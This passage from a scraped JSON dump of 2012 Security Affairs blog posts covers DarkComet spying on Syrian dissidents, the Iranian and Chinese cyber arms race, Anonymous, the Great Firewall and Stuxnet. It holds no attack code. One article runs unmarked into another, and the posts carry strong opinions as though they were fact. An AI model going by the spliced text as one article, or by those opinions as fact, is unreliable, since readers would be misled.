Assad government is control of the media and the information that the opposition is able to send outside the country. Opponents have made extensive use of social networking platforms to organize the protest, and to disseminate information censored by the government. The Syrian government then fielded his knowledge to try to contain the threat.\n\nThe situation is quite different from what has been observed during the revolutions in Egypt and Tunisia when the Egyptian government shut down the country\u2019s internet access because activists were using social media to organize protests. The Assad\u2019s regime allowed Syrians to access to social media like Facebook and YouTube, a strategy that allows the government to track dissidents\u2019 actions on internet.\n\nThe experts of the Trend Micro firm have discovered the usage of the malware DarkComet to infect the computers of the opposition movement. The malware is used to steal documents from the victims and it appears to have been spread through Skype chats.  Once in execution the malware try to contact the command and control (C&C) server to receive instruction and also to transfer the stolen information. It has been observed that the C&C server is resident in Syria, the range of the IP addresses is under the control of the government of Damascus.\n\nWhat is DarkComet and how it works?\nAccording Trend Micro blog it is considered a widely available Remote Access Trojan (RAT) that is used to take pictures via webcam of the remote host, to listen in on conversations via a microphone attached to a PC, to gain full remote control of the victim and of course key logging it.\n\nThe use of malware was not the only operation conducted by the Syrian government in fact supporters of the regime  the \u201cSyrian Electronic Army\u201d have conducted several cyber attacks against web site and social media used by the opposition movement. Several web sites have been defaced and also Facebook accounts used by the protesters  have been taken ad targets. Don\u2019t forget that The Syrian Computer Society was headed by al-Assad in the 1990s demonstrating the high interest in cyber warfare of the government.\n\nOn the blog is reported:\nDarkComet is still being developed and version 5 was released last January 15. It is created by a coder using the handle DarkCoderSc and was first coded in 2008. Since the reports of its use in connection with events in Syria, the author of DarkComet has expressed regret and while he will continue developing the RAT, he plans to make a DarkComet detector/remover available to the Syrian people.\n\nWhat is happening in Syria and the response of the Damascus government must lead us to a series of questions:\n\nMassacres like what we are witnessing must be condemned in a unanimous and fought on the onset of the fighting. Inconceivable that nations like Russia and China for its own economic benefit are opposed to penalties against Syria.\n\nA guarantee of freedom of expression of opposition movements in the United Nations should set themselves cyber task force capable of cyber attacks to render harmless the measures taken by oppressive regimes. Knowledge and technologies exist and preventive actions against states like Syria would be desirable. The reality is that western companies provide all the support to contries like Syria and Iran. More strong laws and penalties are needed. Assisting helpless a massacre of innocents is disheartening.\n\nStarting from year, Syrian activists noticed that the country\u2019s telecommunications ministry was eavesdropping on Facebook traffic. The hack was simple like efficient,  using phishing attacks conducted through social media like twitter. In this ways users were redirected to fake web site with the intent to capture many sensible information like passwords and private messages.  Why has observed this behavior of the syrian government without taking precautions? Could be enough sanitize the bait links in Twitter and Facebook messages used by Assad?\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/assad", "topic_name": "Assad"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cc", "topic_name": "C&C"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/darkcomet", "topic_name": "DarkComet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/facebook", "topic_name": "Facebook"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/massacre", "topic_name": "massacre"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rat", "topic_name": "RAT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-media", "topic_name": "social media"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-network", "topic_name": "Social Network"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syria", "topic_name": "Syria"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/syrian-electronic-army", "topic_name": "Syrian Electronic Army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/war", "topic_name": "war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/web", "topic_name": "web"}]}, {"news_name": "Cyber arms race, too many shadows on the future", "news_link": "https://securityaffairs.co/wordpress/2869/intelligence/cyber-arms-race-too-many-shadows-on-the-future.html", "title": "Cyber arms race, too many shadows on the future\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 24, 2012", "body": "The Mehr News Agency has published a declaration of brigadier general Gholamreza Jalali collected during an official conference that demonstrate the high interest in warfare of Iran.\n\n\u201cThe US is downsizing its army for bigger cyber defense infrastructure. So countries like Iran also have to set up and upgrade their cyber defense headquarters and even [build] a cyber army.\u201d\n\nThe military has discussed regarding the intention of its country to develop a very effective cyber strategy, a must to reply to the cyber attacks which have been conducted against Iran. Of course the reference to the cyber weapon Stuxnet it\u2019s clear, the virus has been developed with the purpose to damage the Iranian nuclear program.\n\nIran\u2019s commitment to developing a cyber strategy, indicates that the country is investing in the sector also in terms of cyber offense, this consideration must alarm the West countries and all those states considered enemies of Tehran.  As said many times the effect of the use of cyber weapons could be devastating in relation to the real state of critical infrastructuresthat western countries have discovered suddenly vulnerable. Stuxnet marked a turning point in revealing all the limitations of defense capabilities of those who presumably created the malware.  Industrial sabotage made using cyber weapon is a reality of this days, a military option that can be adopted on large scale against critical infrastructures. I share the same conviction of Eugene Kaspersky that during event in Cancun has declared:\n\n\u201cI\u2019m afraid yes.\u201d Because so much of our physical infrastructure is internet-connected and computer-controlled, it\u2019s possible to stop critical equipment from working.\n\n\u2026 it\u2019s a shame I did not have the opportunity to hear him live.\n\nThe cyber weapons have several advantages in adopting them, mainly:\n\nWe are confronted in recent years with a new arms race for cyber weapons development, governments around the world compete for the project of innovative weapons, a cultural revolution which is able to put on the same plane superpowers as U.S. and China and nations have always have considered minor as Iran and Bangladesh. The consequence is the redrawing of a new political map in which countries join forces to deal with such giants as Israel.\n\nThe only way to avoid catastrophic event is to make a strong reality cooperation between states, only joining their cyber capability is possible to guarantee a mutual protection against cyber threats.\n\nOf course, while cooperation can create new synergies on the other hand it can creates new monsters. Business from the real world, from high finance, consolidate agreements in cyber space. Hence arise alliances that scare like China \u2013 Iran or China-North Korea and even Russia and China.\n\nArmy Lt. Gen. Ronald L. Burgess, director of the Defense Intelligence Agency, disclosed new details of China\u2019s space weapons programs last week declaring that it includes anti-satellite missiles and cyber warfare capabilities.  According Burgess the main real cyber threat is China that apparently is supporting civil projects but in reality is preparing an efficient weapons program.\n\n\u201cChina\u2019s successfully tested a direct ascent anti-satellite weapon (ASAT) missile and is developing jammers and directed-energy weapons for ASAT missions,\u201d he said.\n\u201cA prerequisite for ASAT attacks, China\u2019s ability to track and identify satellites is enhanced by technologies from China\u2019s manned and lunar programs as well as technologies and methods developed to detect and track space debris.\u201d\n\nAnalysts estimate that with as many as two-dozen ASAT missiles, China could severely disrupt U.S. military operations through attacks on satellites. China\u2019s Beidou global positioning system satellites will be available for regional users this year and globally by 2020.\n\nThe Chinese, Russians and also North Korea have developing capabilities to interfere with or disable U.S. space-based navigation, communications, and intelligence satellites.\n\nThere is another aspect that should lead to concern, the proliferation of these weapons and the simplicity to find them in cyberspace makes possible infiltration of criminals.\nThe cyber crime is refining its techniques and turns increasingly to the technology sector for the creation of new complex fraud. What could happen if using a process of reverse engineering of a cyber weapon criminals will be able to develop new one?\n\nWhile governments are confronted in the new cyberspace uncontrollable forces can break patterns and balances, a cross threat without borders before which all countries are still unprepared.  Think is enough? Wrong! I purposely left for last the phenomenon of hacktivism. Today we are witnessing an escalation of operations of groups like Anonymous, but I think it unlikely that famous groups can really offend critical structures. I\u2019m more afraid of those who wish we believe it. However, the management of the threat Anonymous involves a significant deployment of energy for its victims.\n\nHow to explain the risks and dangers that threaten our facilities to persons not involved in the work?\n\nWe can identify a multitude of dangers, the technological impetus behind each infrastructure has brought several vulnerabilities. Layers and layers of software levels or components badly developed by third parties that have not followed strict recommendations on security in the design phase, the need for a remote control ever more stringent, vulnerabilities in the authentication processes \u2026 and still, malware able to operate silently watching for years the facilities and gathering info for future attacks, exposure of services simply identifiable and that could be impaired by all sorts of attacks (e.g. SLQ injection rather than DDoS), thin perimeter security , sometimes the lack of adequate security policies, and finally the factor of greatest risk, the human factor. Just the human component is often unmanageable, be it an insider or an user that superficially make unauthorized use of storages and supports (e.g. USB token) or circumvents security policies to chat with him girl\u200b\u200bfriend.\n\nWhen we talk about cyber weapon we have to contextualize it the typical operational scope just described .\n\nThe availability of a multitude of information on each possible target. Without resorting to sophisticated OSINT techniques just browse the internet to know the planimetry of a place, critical structures around it, evaluate the response time to an attack by the authorities and even know the type of exposure system runs on a network, vulnerabilities notes and instructions to exploit them. We can also make some research on the companies that has access to the plan, we can collect information attacking contractor usually more vulnerable and the game is done. That is a cyber war scenario, simply as dangerous.\n\nI conclude with a reflection on our future that I find extremely significant. While nations such as China, India and Iran are investing to spread knowledge among their young people about methods of cyber defense and cyber offense.\nChina first is suspected of using patriotic hackers and cyber militias for defense and offense. According to the Financial Times, Nanhao Group, a web company outside of Beijing, has departments tasked for attacks and defense, and this Chinese report mentions cyber militias in Tianjin\u2019s Hexi District. It is completely different the approach followed in Europe, in these countries this kind of information is limited to a small circle of people with distressing consequences, security is oligarchy.\nIn Italy the person involved in security scenarios are always the same, little innovation and little investments in the future. On long period this attitude will lead to an unbridgeable gap, and we will face with serious problems.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-arms-race", "topic_name": "Cyber arms race"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-offense", "topic_name": "cyber offense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberspace", "topic_name": "cyberspace"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/osint", "topic_name": "OSINT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}]}, {"news_name": "Critical infrastructures & manipulation of the name Anonymous", "news_link": "https://securityaffairs.co/wordpress/2807/intelligence/critical-infrastructures-manipulation-of-the-name-anonymous.html", "title": "Critical infrastructures & manipulation of the name Anonymous\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 22, 2012", "body": "What are the main dangers for our infrastructures? Too much threats which any country is exposed. The situation is bleak, suddenly the sectors of defense found themselves vulnerable to cyber threats. Once nations shown their proud arms, flaunt power, intimidating opponents in this way. Today the way of fighting is radically changed, the battleground is cyberspace, the armies are composed by groups of hackers and cyber weapons are sophisticated weapons designed to attack strategic targets \u2026 mainly the wars today are silent. This last aspect is not negligible, country like China has started the warfare first of many other nations, the objectives of raids and of cyber operations of industrial espionage are often realized when the main damages had been already caused. In some cases we speak of a competitive advantage than a decade, we think the case study of Nortel and the damage caused by a decade of spying. The political landscape has radically changed, today countries like U.S., Japan and Russia are subject to the offensive of those nations once been relegated to marginal roles on the international stage. In mid July 2010, security experts discovered the virus called Stuxnet that had infiltrated computers inside nuclear plants and other infrastructures in country like Iran. It is considered \u201cthe first\u201d cyber weapon of the history.\n\n\n\nIt is completely changed the way to conduct intelligence operations now moves through a meticulous analysis of the battlefield, Internet, studying the operations in the cyber space of opposing forces, nations and companies to spy.\n\nMany aspects are profoundly changed, alliances that were once unimaginable has become reality today and they are able to frighten technologically advanced nations such as Israel and U.S.. For example let me cite China-Iran axis, or the support provided by China itself to nations like North Korea in offending military targets such as South Korea or Japan.\nAll this turmoil has the main effect of addressing significant capital in critical areas such as cyber defense to compensate cyber gap. Uncomfortable situation that governments tend to conceal and hide from its citizens, I live in Italy and if I go on the streets to ask ordinary people the cost of spending on warfare they will take me for a fool.\nThe awareness level on the topic is practically zero. The question remains how much effective are these measures and what is the level of security we are able to provide?  We are in an embryonic stage in which it is too early hazard a hypothesis about the real state in term of security of the critical infrastructures all over the world. Who is threaten our tranquility?\n\nMain threats come from:\n\nThe threat of cyber crime and those made \u200b\u200bby the actions of protest of groups of hacktivists are sources of considerable concern. So far this year we have witnessed an escalation of the phenomenon of hacktivism, the Anonymous group seems to have upped the ante, between doubts and misgivings about the real genesis of operations, numerous attacks have been registered against government sites and security agencies.\n\nGen. Keith Alexander, current director of the National Security Agency warned regarding the possibility that groups of hacktivist will have the ability in short term to bring cyber attack to the national power supplies causing a limited power outage in the US..\nPower supplies are just one possible target, don\u2019t forget the critical of telecommunications systems, gas and oil storage and transportation, banking and finance, transportation, water supply systems and emergency services.  The profile of cyber assaults against US government and corporate targets is increasing manifesting high skill in the cyber strategy of the attacks.\n\nIf forces like those of hacktivist have the technical capacities and critical mass such that they can influencing foreign policy, are we sure that among their goals there are critical infrastructures?\n\nWhy the group that draws its strength from the masses should attack them, put them in danger? \n\nDoes Anonymous want this?\n\nIn an official message to the Wall Street Journal Anonymous regarding the accusation has written\n\n\u201cRidiculous! Why should Anonymous shut off power grid? Makes no sense! They just want to make you feel afraid.\u201d\n\n\u201cWhy would Anons shut off a power grid?\u201d reads a tweet from the @YourAnonNews feed. \u201cThere are ppl on life support / other vital services that rely on it. Try again NSA. #FearMongering\u201d\n\nThe researcher of the Mercatus Center at George Mason University, Jerry Brito, told that Anonymous has never made a threat to the electrical grid or to other critical infrastructure.\nBut then, why these rumors began to circulate in authoritative newspapers? More of the group itself I\u2019m scared of misuse of the name Anonymous, someone using the causes of the hacktivists to create a climate of emergency, declare openly to the world that we are terribly vulnerable.\nMaybe someone is convinced that scaring the public is possible to remove the masses from the ideology behind the staged protests. The sad aspect is that someone could use the threat to justify expenses never disclosed before, in a state of emergency is known that many canonical steps for approval of investments are deliberately skipped to the benefit of nearby businesses to governments.\n\nWhy we intend to define the components of Anonymous cyber-terrorists and cyber criminals?\n\nMr. Richard Stiennon, Chief Research Analyst at IT-HARVEST, draws some distinctions in the definitions as well. A cybercriminal is generally motivated purely by profit. That is a different goal than cyber espionage, which seeks to access intellectual property for military or industrial strategic advantage, or cyberwar, which focuses on actually sabotaging infrastructure, disrupting critical systems, or inflicting physical damage on an enemy.\n\nDo you recognize anonymous in one of these definitions?\n\nThe reality is dramatic, many countries like America and european members states are vulnerable to cyber attacks. Tens and thousands of critical structures are still vulnerable and in many cases also not counted. The real problem will be actions of cyber-terrorism, the business of terror is aware of the situation of the infrastructures and it is ready to hit.

Nothing is changed, the government plans to continue censoring social networking sites according to the declarations of the Communist Party and State Council regarding China\u2019s 12th Five-Year Plan (2011-2015) on cultural reform and development.\n\nThe outlook is very bad, they are violating human rights in this way being censorship used also for the purpose to persecute opponents of the government. The \u201cViolated Freedom\u201d is the new cyber threat as I wrote in an article some months ago.\n\nWhat is worrying is that also in those countries where the level of monitoring/censorship is high we observe a high perception of corruption. Corruption and censorship, two sisters who walk hand in hand regardless of human rights.\n\nThe Chinese government will increase regulation of domestic social networks and of other social media platforms including blogging, but it is only the beginning because it will also be implemented more restrictive measures to protect private information online and improving the country\u2019s system assess to online security.\n\nObviously that a so oppressive policy is to the center of a heated debate, inevitable that groups like Anonymous hacktivist may be interested in planning their intervention because the Chinese government, this is the genesis of OpChina campaign. Anonymous hackers, a group named RevolutionSec, have attacked Chinese government websites on Wednesday 15th, posting the stolen data online.\nThe group has announced to have successfully breached a Chinese government trade site. Following the fashion of the moment, the information was published on Pastebin and via the tweetter platform with the message \u201d \u201cBring down the great firewall of China\u201d.\n\nMoreover 8,000 accounts have been compromised exposing the usernames and encrypted passwords.Are we assisting to a true call to arms of the several groups linked to Anonymous?\n\nAccording to experts, the group is determined to hack the \u201cGreat Firewall\u201d, a term that indicates the project of Internet monitoring by the Beijing government called The Golden Shield. Thanks to this systems the Chinese authorities are able to block the access to a number of websites accused of being opponents of the regime or to be outlaw.\nThe Chinese government on more than one occasion has been accused of having sponsored attacks made by hacking groups against foreign industries and governments with the dual intention of offending the cyber adversaries and steal sensitive information of varying utility.\n\nWhile I understand the choice to attack what is the symbol par excellence of censorship, The Great Firewall, I am surprised that this happens at this historical moment. Why has not happened before? Why does Anonymous decide to fight the Great Firewall right now?\n\nI illustrate some cases hoping that you can give me your point of view on the subject.\n\nThe escalation of Anonymus operations has somehow increased awareness of their skills and it has given the proof that the group wants to compare with more challenging objectives.\nFuthermore, we add that the targets hit and the followed timeline of the attacks has certainly provided great visibility to the group, visibility, and consensus used to encourage the involvement of a critical mass to involve attacks.\n\nAnother hypothesis is that for some reason the group was directed against the cyber as part of a cyber strategy defined by Western governments. Hypothesis possible if one accepts that the structure may have been infiltrated in some way.\n\nThe third hypothesis is very plausible, Let\u2019s think that someone is using the name Anonymous to conduct undercover operations and to be able to attack hostile governments like that of Beijing. Professing itself as members of Anonymous today means having huge acclaim and can count on a critical mass to recruit in cyber attacks. These operations may be used as diversions for further operations of western intelligence in the cyberspace.\n\nThe mystery is dense but I believe that in the coming months we will have a clearer picture of the situation.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  (China, Great Firewall)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/beijing", "topic_name": "Beijing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/corruption", "topic_name": "corruption"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategy", "topic_name": "cyber strategy"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/great-firewall", "topic_name": "great firewall"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/human-rights", "topic_name": "human rights"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-monitoring", "topic_name": "internet monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring-system", "topic_name": "monitoring system"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/opchina", "topic_name": "OpChina"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/the-golden-shield", "topic_name": "The Golden Shield"}]}, {"news_name": "Stuxnet \u201cneutralized\u201d \u2013 Who sows the wind storm gathers!", "news_link": "https://securityaffairs.co/wordpress/2599/malware/stuxnet-neutralized-who-sows-the-wind-storm-gathers.html", "title": "Stuxnet \u201cneutralized\u201d \u2013 Who sows the wind storm gathers!\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 15, 2012", "body": "The news has caused much uproar in the scientific community, according European and U.S. officials and private experts the iranian scientists have isolated and made harmless the Stuxnet malware that has infected the control systems of the nuclear plants all over the country. For some years Iranian security experts are facing with this virus that is considered the first cyber weapon in the history used to attack critical infrastructures of a country,  in this case some nuclear plants in which Teharan government is pursuing its nuclear program.\n\n\n\nCyber warfare expert John Bumgarner claims that the Stuxnet and Duqu virus have been active for much longer than previously suspected, he says that they are active in different variant since 2006. Precisely he claims that the Stuxnet computer virus is linked to Conficker, a mysterious \u201cworm\u201d that surfaced in late 2008 and infected millions of PCs. Conficker was used to open back doors into computers in Iran, then infect them with Stuxnet \u2026 \u201cConficker was a door kicker,\u201d\n\nIt is clear that Stuxnet has been designed with the intent to strike the Iranian nuclear program and even more clear is who has always opposed such a program, U.S. and Israel first. To corroborate the thesis we made the consideration that the tecnology skill necessary to develope a similar weapon is really high and during the investigation made by the main security firms it has been discovered that Stuxnet is just a component of a larger project. The innovative project is related to the development of an open platform used to assemble the deadly cyber weapons in relation to the final targets.\n\nIt has been discovered a platform behind Stuxnet called \u201cTilded Platform\u201c, used also for the development of Duqu malware, and that make possible the development of a set of reusable tools, a true innovation that make possible the composition of ever new and enhanced agents with modules developed to fulfill specific functions against clearly defined targets. Officially the U.S. and Israeli governments have always rejected any allegations concerning the paternity of the virus and agents related to it.\n\nWho developed Stuxnet has demonstrated a deep knowledge of the vulnerabilities of industrial control systems, result of a meticulous intelligence action that has left no stone unturned.\n\nHow have the Iranians eradicated the malware from their systems?\n\nIn November 2010, Iranian President Mahmoud Ahmadinejad said that malicious software had created problems in some of Iran\u2019s uranium enrichment centrifuges, although he declared that the problems had been solved. At the moment there are no official information on how they managed to defeat Stuxnet and there are many hypotheses in circulation. The most credible claim that Iranian scientists have availed themselves of the support of experts from Western that from several years are on the trail of malware. The clamor around Stuxnet and countless surveys on the structure of the code on which is based would provide valuable information for the neutralization of the virus.\n\nPeter Sommer, a computer security expert based in Britain, said that once Iran had detected the presence of the worm and figured out how it worked, it shouldn\u2019t have been too hard for them to disable it. \n\n\u201cOnce you know that it\u2019s there it\u2019s not that difficult to reverse engineer\u2026 Neutralization of Stuxnet, once its operation is understood, would not be that difficult as it was precisely engineered to disrupt a specific item of machinery.\u201d \u201cOnce Stuxnet\u2019s signature is identified it can be eliminated from a system,\u201d Sommer added.\u201d\n\nI fully share the Summer\u2019 point of view and I add that the work of reverse engineer made on the virus has made possible to understand how Stuxnet operates, that knowledge could be used as a starting point for the development of further cyber weapons. Paradoxically, a weapon used to injure could be studied and suitably modified to attack control systems scattered across the world.\n\nMany studies revealed a drammatic sytuation in Europe and USA alerting the world population about the possibility of attacks that could compromise the computer systems of critical structures. Unfortunately, many countries are still behind in the implementation of a cyber strategy that protects the population from the looming cyber threat.\n\nThe concern is high, it could materialize the nightmare of every responsible government. An incident can undermine the safety of millions of individuals and of the entire nation. Dozens, hundreds, thousands of installations all over the country potentially vulnerable to attack from anywhere on the planet, attacks that happened in what we might call the fourth dimension, cyberspace, and that could also lead to the loss of many human lives. Not necessarily our minds must fly at a nuclear plant and led to an accident in its of government systems, you can just think about the impact it could have on a chemical plant as many.\n\nThe announcement of the neutralization of Stuxnet could kick off a new phase of evolution of the dreaded cyber threat, therefore I consider essential to be able to evelare alert level against these threats. Probably while we are reading this article, Iranian experts are already working on the next cyber weapon to use against Western enemy.\nWho sows the wind storm gathers.\n\nPierluigi Paganini\n\nhttp://ca.news.yahoo.com/experts-iran-neutralized-stuxnet-virus-231246798.html\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/conficker", "topic_name": "Conficker"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}]}, {"news_name": "Iran case \u2026 security threat and oil business", "news_link": "https://securityaffairs.co/wordpress/2512/intelligence/iran-case-security-threat-and-oil-business.html", "title": "Iran case \u2026 security threat and oil business\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 13, 2012", "body": "At this time we are seeing continuing propaganda operations of Iranian government that is trying to convince with its proclamations the public opinion regarding technical capacities in its possession. Military troops, nuclear weapons, and a cyber army ready to destroy any enemy stronghold in cyber space. Too much experts believe that in reality, the West rather than being concerned about the direct threat of Iran is literally paralyzed by the specter of two nations too close to the government of Ahmadinejad, China and Russia. At stake is the economic balance of the biggest world market, too important for western capitalism and that rapresent an indispensable opportunity. Is it true?\n\nU.S. and members states of the European Community know the value and potential of this market at a time of great crisis, that is why they prefer adopt an international policy not aggressive and that tends to forgive unacceptable behaviour of countries like Syria and Iran.\n\nAre we aware of the economic and political impact of a so reckless conduct on the internal situation?\n\nThe mediatic exposure is certainly very challenging because it requires a commitment of central government in terms of defense very costly, counter-trend compared to what we are witnessing in European countries like Italy where these expenditures have been reduced dramatically. Iran is operating under different profiles in terms of diplomacy, weaving relationships and alliances with countries opposed to the U.S. dominant position. What worries most is this aspect that would allow to the government in Tehran also to procure weaponry technologies not otherwise obtainable.\n\nThe close cooperation with Syria, for example has always been a channel of choice for the subterranean dialogue with countries like Russia, the Moscow government in fact is closely linked to that of Damascus for the supply of defense systems.\n\nOil reserves in Iran, according official sources government, rank third largest in the world, although it ranks second if Canadian reserves of unconventional oil are excluded. This is roughly 10% of the world\u2019s total proven petroleum reserves. Iran is the world\u2019s fourth largest oil producer and is OPEC\u2019s second-largest producer after Saudi Arabia and this confer to the Country an enormous economic power, but it is also true that it is a good motivation to consider Iran as an enemy.\n\n\n\nWe must recognize that Iran have understood the importance of its cyber presences addition to the ordinary military, that is why its government is recruiting groups of hacker in the Middle East in the name of Jihad against the West Enemy.\n\nThanks to the strategic position under the energetic perspective Iran is really close to that Eastern countries where energy demand is greater. For example, China\u2019s oil trade with Iran is know has normal commercial activity, many intelligence specialist are convinced that Chinese government has contributed to cyber training of Iranian special units that were engaged in computer raid against Israel and other nations guilty of having relations with the West oppressor.\nThe People\u2019s Republic of China is the world\u2019s most populous country and the second largest oil consumer, behind the U.S. , a machine that consumes energy.\nChina is one of the main oil and gas importer from Iran. While the U.S. and EU were opposing to Iran\u2019s nuclear program, China signed in October 2004 its largest energy deal with Iran ever. China is not officially against the Iran\u2019s nuclear program and this position indicates that China is interested in a militarily leadership of Iran in the Gulf due its energy needs.\n\nU.S. intelligence officials indicated that Iran is prepared to launch terrorist attacks inside the United States while in the past it was responsible of attacks overseas.\nHow and when this attack could became reality? The increasing interest in the warfare of Iran suggest that it could try to attack the U.S. first in the cyber space to destabilize the country, they are dreaming a cyber 11/9, but is it possible? Is is possible that a cyber threat could causes so critical damages?\n\nUnfortunately yes, the events of this days have demonstrated that with a well written virus it\u2019s possible to infect million of machines using them to attack institutions or critical infrastructures. This last point is really worrysome, the US ad also other western countries have a lot of critical infrastructures, like nuclear plants, facilites, telecomunication systems, that can be target of attacks. The security level of these structures today is certainly not very satisfactory and the U.S. government is working on this, conscious of the threat.\n\nIran has capitalized the lesson from the Stuxnet case, on how could be dangerous a cyber weapon developed to attacks specific target and maybe it is working on something like that. European firms that play a key role in nuclear power and other critical sectors have been targeted by a cyber espionage attack based on virus Stuxnet like. The risk that new intelligence-gathering tool have been developed to infiltrate computer networks with the intent to steal confidential information and potentially reveal vulnerabilities that could be exploited in later attacks.\n\nNo matter who is really behind this attacks what is allarming is that those person could be engaged to target US or European target, like other sectors infact there is the concrete risk that groups of cyber mercenaries could support hostile governments in the development of cyber weapon.\n\nWill we be willing to wait for the day when nations like Iran will become truly out of control? Can we still allow to Russia and China to prohibit military operations against states like Syria and Iran?\nObviously not, and the proof of this is in the words of the Defense Secretary Leon E. Panetta during an interview with CBS\u2019s \u201c60 Minutes\u201d. He said that Iran was probably one year away from being able to build a bomb. He added that it could take a year or two beyond that to develop the ability to deliver a warhead by missile. That is the point of no return in my opinion, that why we could assist to an escalation within next year, but it is impossible to make any forecast of the events due the complex scenario.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu", "topic_name": "duqu"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence-gathering-tool", "topic_name": "intelligence-gathering tool"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": 